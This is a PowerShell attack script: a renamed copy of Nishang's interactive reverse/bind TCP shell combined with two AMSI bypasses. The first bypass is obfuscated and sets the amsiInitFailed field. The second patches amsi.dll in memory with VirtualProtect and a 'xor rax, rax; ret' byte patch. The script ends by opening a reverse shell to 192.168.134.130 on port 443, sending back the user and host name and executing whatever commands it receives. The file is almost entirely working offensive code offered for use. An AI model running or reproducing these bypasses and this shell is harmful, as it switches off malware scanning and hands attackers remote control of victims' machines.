function Power 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

function Csw{

S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

}

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

If ([IntPtr]::Size -eq 8) {
	Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
	Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null

Power -Reverse -IPAddress 192.168.134.130 -Port 443
